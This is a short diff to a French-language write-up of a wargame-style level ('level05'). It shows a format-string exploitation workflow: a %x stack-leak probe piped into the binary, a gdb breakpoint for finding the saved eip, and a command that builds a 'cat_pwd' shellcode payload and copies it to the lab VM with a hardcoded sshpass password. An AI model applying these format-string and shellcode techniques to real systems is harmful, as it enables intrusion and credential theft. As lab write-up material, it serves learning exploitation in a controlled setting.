@@ -39,7 +39,7 @@ Il nous faut trouver ces deux adresses. On commence par introduire notre shellco
 export SCRIPT="$(cat /tmp/args/env_var)"
 ```
 
-Ensuite dans gdb on place un breakpoint au niveau de la fonction _printf_, puis on rentre dans la fonction pour récupérer l'**eip sauvergardé** :
+Ensuite dans gdb on place un breakpoint au niveau de la fonction _printf_, puis on rentre dans la fonction pour récupérer l'**eip sauvegardé** :
 
 ```gdb
 b *0x8048507
@@ -64,7 +64,7 @@ Maintenant que nous avons nos deux adresses il faut construire notre _format str
 En utilisant cette commande :
 
 ```bash
-$ echo "aaaaaaaaaaaaaaaaa %x %x %x %x %x %x %x %x %x %x %x %x %x %x"
+$ echo "aaaaaaaaaaaaaaaaa %x %x %x %x %x %x %x %x %x %x %x %x %x %x" | ./level05
 aaaaaaaaaaaaaaaaa 64 f7fcfac0 0 0 0 0 ffffffff ffffd4e4 f7fdb000 61616161 61616161 61616161 61616161 78252061
 ```
 
@@ -79,7 +79,7 @@ Pour palier à ce problème, on va écrire les 2 octets les plus bas de notre ad
 Depuis l'hôte :
 
 ```bash
-make && ./generator && sshpass -p '3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN' scp -P 4242 -r args level05@localhost:/tmp/
+make && ./generator shellcodes/cat_pwd.s  && sshpass -p '3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN' scp -P 4242 -r args level05@localhost:/tmp/
 ```
 
 Sur la vm :
